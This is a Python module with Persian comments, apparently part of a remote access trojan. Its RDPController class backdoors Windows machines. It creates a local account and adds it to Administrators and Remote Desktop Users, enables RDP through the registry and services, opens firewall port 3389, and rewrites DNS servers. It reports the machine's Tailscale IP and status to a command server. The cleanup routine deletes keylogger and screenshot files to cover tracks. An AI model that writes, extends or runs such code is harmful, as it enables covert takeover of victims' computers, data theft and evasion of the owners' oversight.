import logging
import os
import json
import socket
import subprocess
import winreg
import requests
import ctypes
import time
import re
from typing import Dict, Optional, Any
from rat_config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        if not Config.ENABLE_RDP_CONTROL:
            logging.info("RDP control disabled in config")
            return
            
        self.encryption = encryption_manager
        self.communicator = ServerCommunicator(Config.get_client_id(), encryption_manager)
        self.tailscale_ip = None
        
        if Config.DEBUG_MODE:
            logging.info("RDPController initialized")

    def _is_admin(self) -> bool:
        """بررسی دسترسی Administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            logging.error(f"Admin check error: {str(e)}")
            return False

    def _run_command(self, cmd: list, timeout: int = 30) -> Dict[str, str]:
        """اجرای دستور با مدیریت خطا"""
        try:
            if Config.DEBUG_MODE:
                logging.debug(f"Executing: {' '.join(cmd)}")
                
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            output = {
                "status": "success" if result.returncode == 0 else "error",
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip()
            }
            
            # مدیریت پیام‌های خطای خاص
            if "longer than 14 characters" in output['stderr']:
                output['stderr'] += "\n[WARN] Legacy Windows password restriction detected!"
            elif "The specified rule already exists" in output['stderr']:
                output['status'] = "success"
                output['stderr'] += "\n[INFO] Rule already exists"
            elif "Access is denied" in output['stderr']:
                output['stderr'] += "\n[ERROR] Insufficient permissions"
                
            if Config.DEBUG_MODE:
                logging.debug(f"Command result: {output}")
                
            return output
            
        except Exception as e:
            logging.error(f"Command execution crashed: {str(e)}")
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def _user_exists(self, username: str) -> bool:
        """بررسی وجود کاربر"""
        cmd_result = self._run_command(["net", "user", username])
        return cmd_result["status"] == "success" and "The command completed successfully" in cmd_result["stdout"]

    def _set_dns(self) -> bool:
        """تنظیم DNS"""
        if not Config.ENABLE_RDP_CONTROL:
            return False

        try:
            result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
            if result["status"] != "success" or not result["stdout"].strip():
                logging.error(f"Failed to get active network adapter: {result['stderr']}")
                return False
                
            adapter_name = result["stdout"].strip()

            # تنظیم DNS اولیه
            cmd_primary = [
                "netsh", "interface", "ip", "set", "dns",
                f"name={adapter_name}", "source=static",
                f"addr={Config.PRIMARY_DNS}"
            ]
            result_primary = self._run_command(cmd_primary)
            if result_primary["status"] != "success":
                logging.error(f"Failed to set primary DNS: {result_primary['stderr']}")
                return False

            # تنظیم DNS ثانویه
            cmd_secondary = [
                "netsh", "interface", "ip", "add", "dns",
                f"name={adapter_name}", f"addr={Config.SECONDARY_DNS}",
                "index=2"
            ]
            result_secondary = self._run_command(cmd_secondary)
            if result_secondary["status"] != "success":
                logging.error(f"Failed to set secondary DNS: {result_secondary['stderr']}")
                return False

            logging.info(f"DNS set to {Config.PRIMARY_DNS} and {Config.SECONDARY_DNS} on adapter {adapter_name}")
            return True
            
        except Exception as e:
            logging.error(f"Error setting DNS: {str(e)}")
            return False

    def _get_tailscale_ip(self) -> bool:
        """دریافت IP Tailscale"""
        if not Config.ENABLE_TAILSCALE:
            return False

        try:
            result = self._run_command(["tailscale", "ip", "-4"])
            if result["status"] == "success" and result["stdout"]:
                self.tailscale_ip = result["stdout"].strip()
                logging.info(f"Tailscale IP retrieved: {self.tailscale_ip}")
                return True
            else:
                logging.error(f"Failed to get Tailscale IP: {result['stderr']}")
                return False
        except Exception as e:
            logging.error(f"Error getting Tailscale IP: {str(e)}")
            return False

    def enable_rdp(self, params: Dict = None) -> Dict[str, Any]:
        """فعال‌سازی RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            return {"status": "skipped", "message": "RDP control disabled", "details": []}

        if not self._is_admin():
            logging.error("Admin privileges required to enable RDP")
            return {"status": "error", "message": "Admin privileges required", "details": []}

        details = []
        try:
            # استفاده از تنظیمات از config یا پارامترها
            username = params.get("username", Config.RDP_USERNAME) if params else Config.RDP_USERNAME
            password = params.get("password", Config.RDP_PASSWORD) if params else Config.RDP_PASSWORD
            create_user = params.get("create_user", Config.RDP_CREATE_USER) if params else Config.RDP_CREATE_USER

            # ایجاد کاربر اگر درخواست شده
            if create_user:
                if not self._user_exists(username):
                    # ایجاد کاربر
                    result = self._run_command(["net", "user", username, password, "/add"])
                    if result["status"] != "success":
                        details.append({"action": "create_user", "status": "error", "message": result["stderr"]})
                        return {"status": "error", "message": f"Failed to create user: {result['stderr']}", "details": details}
                    details.append({"action": "create_user", "status": "success", "message": f"User {username} created"})

                    # اضافه کردن به گروه Administrators
                    result = self._run_command(["net", "localgroup", "Administrators", username, "/add"])
                    if result["status"] != "success":
                        details.append({"action": "add_admin_group", "status": "error", "message": result["stderr"]})
                        return {"status": "error", "message": f"Failed to add user to Administrators: {result['stderr']}", "details": details}
                    details.append({"action": "add_admin_group", "status": "success", "message": f"User {username} added to Administrators"})

                    # اضافه کردن به گروه Remote Desktop Users
                    result = self._run_command(["net", "localgroup", "Remote Desktop Users", username, "/add"])
                    if result["status"] != "success":
                        details.append({"action": "add_rdp_group", "status": "error", "message": result["stderr"]})
                        return {"status": "error", "message": f"Failed to add user to Remote Desktop Users: {result['stderr']}", "details": details}
                    details.append({"action": "add_rdp_group", "status": "success", "message": f"User {username} added to Remote Desktop Users"})
                else:
                    details.append({"action": "create_user", "status": "skipped", "message": f"User {username} already exists"})

            # فعال‌سازی RDP در رجیستری
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                details.append({"action": "set_registry", "status": "success", "message": "RDP enabled in registry"})
            except Exception as e:
                details.append({"action": "set_registry", "status": "error", "message": str(e)})
                return {"status": "error", "message": f"Failed to enable RDP in registry: {str(e)}", "details": details}

            # راه‌اندازی سرویس‌های RDP
            services = ["TermService", "SessionEnv", "UmRdpService"]
            for service in services:
                result = self._run_command(["net", "start", service])
                if result["status"] == "success" or "already been started" in result["stderr"]:
                    details.append({"action": f"start_{service}", "status": "success", "message": f"Service {service} started"})
                else:
                    details.append({"action": f"start_{service}", "status": "error", "message": result["stderr"]})

            # افزودن قانون فایروال
            firewall_cmd = [
                "netsh", "advfirewall", "firewall", "add", "rule",
                "name=Allow RDP", "dir=in", "action=allow",
                "protocol=TCP", "localport=3389"
            ]
            result = self._run_command(firewall_cmd)
            if result["status"] == "success":
                details.append({"action": "add_firewall_rule", "status": "success", "message": "Firewall rule added for RDP"})
            else:
                details.append({"action": "add_firewall_rule", "status": "error", "message": result["stderr"]})

            # تنظیم DNS
            dns_result = self._set_dns()
            if dns_result:
                details.append({"action": "set_dns", "status": "success", "message": "DNS servers configured"})
            else:
                details.append({"action": "set_dns", "status": "error", "message": "Failed to set DNS servers"})

            # دریافت IP Tailscale
            if Config.ENABLE_TAILSCALE:
                tailscale_result = self._get_tailscale_ip()
                if tailscale_result:
                    details.append({"action": "get_tailscale_ip", "status": "success", "message": f"Tailscale IP: {self.tailscale_ip}"})
                else:
                    details.append({"action": "get_tailscale_ip", "status": "error", "message": "Failed to get Tailscale IP"})

            # گزارش به سرور
            try:
                report = {
                    "client_id": Config.get_client_id(),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "rdp_enabled": True,
                    "details": details
                }
                if self.tailscale_ip:
                    report["tailscale_ip"] = self.tailscale_ip
                    
                self.communicator.report_rdp_tunnel(report)
                details.append({"action": "report_to_server", "status": "success", "message": "RDP status reported to server"})
                
            except Exception as e:
                details.append({"action": "report_to_server", "status": "error", "message": str(e)})

            return {
                "status": "success",
                "message": "RDP enabled successfully",
                "details": details
            }

        except Exception as e:
            logging.error(f"Enable RDP error: {str(e)}")
            details.append({"action": "overall", "status": "error", "message": str(e)})
            return {
                "status": "error",
                "message": f"Failed to enable RDP: {str(e)}",
                "details": details
            }

    def disable_rdp(self) -> Dict[str, Any]:
        """غیرفعال‌سازی RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            return {"status": "skipped", "message": "RDP control disabled", "details": []}

        if not self._is_admin():
            logging.error("Admin privileges required to disable RDP")
            return {"status": "error", "message": "Admin privileges required", "details": []}

        details = []
        try:
            # غیرفعال‌سازی RDP در رجیستری
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                details.append({"action": "set_registry", "status": "success", "message": "RDP disabled in registry"})
            except Exception as e:
                details.append({"action": "set_registry", "status": "error", "message": str(e)})
                return {"status": "error", "message": f"Failed to disable RDP in registry: {str(e)}", "details": details}

            # توقف سرویس‌های RDP
            services = ["TermService", "SessionEnv", "UmRdpService"]
            for service in services:
                result = self._run_command(["net", "stop", service])
                if result["status"] == "success" or "is not started" in result["stderr"]:
                    details.append({"action": f"stop_{service}", "status": "success", "message": f"Service {service} stopped"})
                else:
                    details.append({"action": f"stop_{service}", "status": "error", "message": result["stderr"]})

            # حذف قانون فایروال
            result = self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
            if result["status"] == "success":
                details.append({"action": "remove_firewall_rule", "status": "success", "message": "Firewall rule removed"})
            else:
                details.append({"action": "remove_firewall_rule", "status": "error", "message": result["stderr"]})

            # گزارش به سرور
            try:
                report = {
                    "client_id": Config.get_client_id(),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "rdp_enabled": False,
                    "details": details
                }
                self.communicator.report_rdp_tunnel(report)
                details.append({"action": "report_to_server", "status": "success", "message": "RDP disable status reported to server"})
            except Exception as e:
                details.append({"action": "report_to_server", "status": "error", "message": str(e)})

            return {
                "status": "success",
                "message": "RDP disabled successfully",
                "details": details
            }

        except Exception as e:
            logging.error(f"Disable RDP error: {str(e)}")
            details.append({"action": "overall", "status": "error", "message": str(e)})
            return {
                "status": "error",
                "message": f"Failed to disable RDP: {str(e)}",
                "details": details
            }

    def cleanup_rdp(self) -> Dict[str, Any]:
        """پاک‌سازی RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            return {"status": "skipped", "message": "RDP control disabled", "details": []}

        if not self._is_admin():
            logging.error("Admin privileges required to cleanup RDP")
            return {"status": "error", "message": "Admin privileges required", "details": []}

        details = []
        try:
            # غیرفعال‌سازی RDP در رجیستری
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                details.append({"action": "set_registry", "status": "success", "message": "RDP disabled in registry"})
            except Exception as e:
                details.append({"action": "set_registry", "status": "error", "message": str(e)})

            # توقف سرویس‌های RDP
            services = ["TermService", "SessionEnv", "UmRdpService"]
            for service in services:
                result = self._run_command(["net", "stop", service])
                if result["status"] == "success" or "is not started" in result["stderr"]:
                    details.append({"action": f"stop_{service}", "status": "success", "message": f"Service {service} stopped"})
                else:
                    details.append({"action": f"stop_{service}", "status": "error", "message": result["stderr"]})

            # حذف قوانین فایروال
            result = self._run_command(["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"])
            if result["status"] == "success":
                details.append({"action": "remove_firewall_rule", "status": "success", "message": "Firewall rule removed"})
            else:
                details.append({"action": "remove_firewall_rule", "status": "error", "message": result["stderr"]})

            # حذف کاربر خاص
            username = Config.RDP_USERNAME
            if self._user_exists(username):
                result = self._run_command(["net", "user", username, "/delete"])
                if result["status"] == "success":
                    details.append({"action": f"remove_user_{username}", "status": "success", "message": f"Deleted user {username}"})
                else:
                    details.append({"action": f"remove_user_{username}", "status": "error", "message": result["stderr"]})
            else:
                details.append({"action": f"remove_user_{username}", "status": "success", "message": f"User {username} not found"})

            # حذف فایل‌های موقت
            temp_files = ["keylogger.log", "screenshot.png", "recursive_list.txt", "rdp_diagnostic.log"]
            for file in temp_files:
                try:
                    if os.path.exists(file):
                        os.remove(file)
                        details.append({"action": f"remove_file_{file}", "status": "success", "message": f"Removed {file}"})
                except Exception as e:
                    details.append({"action": f"remove_file_{file}", "status": "error", "message": str(e)})

            # بازنشانی DNS به DHCP
            try:
                result = self._run_command(["powershell", "-Command", "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"])
                if result["status"] == "success" and result["stdout"].strip():
                    adapter_name = result["stdout"].strip()
                    self._run_command(["netsh", "interface", "ip", "set", "dns", f"name={adapter_name}", "source=dhcp"])
                    details.append({"action": "reset_dns", "status": "success", "message": "DNS reset to DHCP"})
            except Exception as e:
                details.append({"action": "reset_dns", "status": "error", "message": str(e)})

            # گزارش پاک‌سازی
            try:
                cleanup_report = {
                    "client_id": Config.get_client_id(),
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "details": details
                }
                # استفاده از report_rdp_tunnel برای گزارش پاک‌سازی
                self.communicator.report_rdp_tunnel(cleanup_report)
                details.append({"action": "report_cleanup", "status": "success", "message": "Cleanup reported to server"})
            except Exception as e:
                details.append({"action": "report_cleanup", "status": "error", "message": str(e)})

            return {
                "status": "success",
                "message": "RDP cleanup completed successfully",
                "details": details
            }
        except Exception as e:
            logging.error(f"RDP cleanup error: {str(e)}")
            return {
                "status": "error",
                "message": f"RDP cleanup failed: {str(e)}",
                "details": []
            }

    def start(self):
        """شروع کنترلر RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            logging.info("RDP control disabled in config")
            return
        
        # بررسی دسترسی Administrator
        if not self._is_admin():
            logging.warning("Admin privileges required for RDP. Running without RDP functionality.")
            return
            
        try:
            result = self.enable_rdp()
            if result["status"] == "success":
                logging.info("RDP started successfully")
            else:
                logging.warning(f"RDP start failed: {result['message']}")
        except Exception as e:
            logging.error(f"Failed to start RDP: {str(e)}")

    def get_rdp_status(self):
        """دریافت وضعیت RDP"""
        if not Config.ENABLE_RDP_CONTROL:
            return {
                "enabled": False,
                "message": "RDP control disabled in config",
                "admin_privileges": self._is_admin()
            }

        status = {
            "enabled": True,
            "admin_privileges": self._is_admin(),
            "user_creation_enabled": Config.RDP_CREATE_USER,
            "tailscale_enabled": Config.ENABLE_TAILSCALE,
            "tailscale_ip": self.tailscale_ip
        }
        
        # بررسی وضعیت سرویس‌ها
        try:
            services = ["TermService", "SessionEnv", "UmRdpService"]
            service_status = {}
            for service in services:
                result = self._run_command(["sc", "query", service])
                service_status[service] = "running" if "RUNNING" in result["stdout"] else "stopped"
            status["services"] = service_status
        except Exception as e:
            status["service_check_error"] = str(e)
            
        return status